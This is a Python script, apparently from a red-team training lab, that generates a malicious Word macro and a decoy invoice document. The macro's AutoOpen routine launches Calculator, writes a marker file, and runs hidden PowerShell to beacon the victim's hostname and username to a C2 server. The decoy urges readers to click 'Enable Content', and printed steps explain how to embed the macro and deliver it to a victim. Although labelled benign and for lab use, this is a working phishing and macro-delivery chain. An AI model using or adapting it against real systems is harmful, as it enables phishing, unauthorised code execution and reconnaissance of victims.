#!/usr/bin/env python3
"""
Generates the VBA macro code and a decoy Word document.
The attacker then embeds the macro in Word on Windows and uploads the .docm back to Kali.

Usage: python3 tools/create_macro_doc.py
Output: payloads/macro_code.vba  +  payloads/invoice_Q4_2024.docx
"""

import os

OUT     = os.path.join(os.path.dirname(__file__), "..", "payloads")
C2_IP   = os.getenv("KALI_IP") or __import__("socket").gethostbyname(__import__("socket").gethostname())
C2_PORT = os.getenv("KALI_PORT", "8080")
os.makedirs(OUT, exist_ok=True)

VBA = f"""\
' ============================================================
' LAB DEMO MACRO  —  invoice_Q4_2024.docm
' AutoOpen fires the moment the victim clicks Enable Content.
' BENIGN: opens Calculator + writes log file + beacons to Kali.
' ============================================================

Sub AutoOpen()
    Call DropPayload
End Sub

Sub DropPayload()
    Dim host As String : host = Environ("COMPUTERNAME")
    Dim user As String : user = Environ("USERNAME")
    Dim tmp  As String : tmp  = Environ("TEMP")

    ' Stage 1 - proof of execution
    Shell "cmd.exe /c calc.exe", vbHide

    ' Stage 2 - artifact on disk
    Dim f As Integer : f = FreeFile
    Open tmp & "\\macro_ran.txt" For Output As #f
        Print #f, "macro executed at " & Now()
        Print #f, "host=" & host & "  user=" & user
    Close #f

    ' Stage 3 - beacon back to C2
    Dim ps As String
    ps = "powershell -nop -w hidden -c " & Chr(34) & _
         "Invoke-WebRequest -Uri 'http://{C2_IP}:{C2_PORT}/beacon" & _
         "?macro=1&host=" & host & "&user=" & user & "' -UseBasicParsing" & Chr(34)
    Shell "cmd.exe /c " & ps, vbHide

    MsgBox "Document loaded. (Lab: check " & tmp & "\\macro_ran.txt)", _
           vbInformation, "Done"
End Sub
"""

vba_path = os.path.join(OUT, "macro_code.vba")
with open(vba_path, "w") as f:
    f.write(VBA)
print(f"[✓] VBA code → {vba_path}")
print(f"    C2 baked in: {C2_IP}:{C2_PORT}")

try:
    from docx import Document
    from docx.shared import Pt
    from docx.enum.text import WD_ALIGN_PARAGRAPH

    doc = Document()
    doc.add_heading("Invoice Q4-2024", 0).alignment = WD_ALIGN_PARAGRAPH.CENTER
    warn = doc.add_paragraph()
    r = warn.add_run("PROTECTED DOCUMENT  --  Click Enable Content to view.")
    r.bold = True
    r.font.size = Pt(12)
    warn.alignment = WD_ALIGN_PARAGRAPH.CENTER
    doc.add_paragraph()
    tbl = doc.add_table(rows=5, cols=2)
    tbl.style = "Table Grid"
    for i, (k, v) in enumerate([
        ("Invoice #",   "INV-2024-Q4-0892"),
        ("Date",        "November 15, 2024"),
        ("Due",         "December 31, 2024"),
        ("Amount",      "$47,250.00"),
        ("Pay via",     "Wire / ACH"),
    ]):
        tbl.rows[i].cells[0].text = k
        tbl.rows[i].cells[1].text = v
    doc.add_paragraph()
    doc.add_paragraph(
        "Enable macros to generate the payment authorisation form."
    ).runs[0].italic = True
    docx_path = os.path.join(OUT, "invoice_Q4_2024.docx")
    doc.save(docx_path)
    print(f"[✓] Decoy document → {docx_path}")
except ImportError:
    print("[!] pip3 install python-docx")

print()
print("=" * 55)
print("  NEXT STEP — embed macro on Windows (attacker machine)")
print("=" * 55)
print(f"  1. Download from Kali:")
print(f"       http://{C2_IP}:{C2_PORT}/payloads/invoice_Q4_2024.docx")
print(f"       http://{C2_IP}:{C2_PORT}/payloads/macro_code.vba")
print(f"  2. Open invoice_Q4_2024.docx in Word")
print(f"  3. Alt+F11 → Insert → Module → paste macro_code.vba")
print(f"  4. File → Save As → invoice_Q4_2024.docm")
print(f"  5. Upload back to Kali:")
print(f"       scp invoice_Q4_2024.docm kali@{C2_IP}:~/red4blue/lesson1/payloads/")
print(f"  6. Victim downloads: http://{C2_IP}:{C2_PORT}/payloads/invoice_Q4_2024.docm")
print("=" * 55)
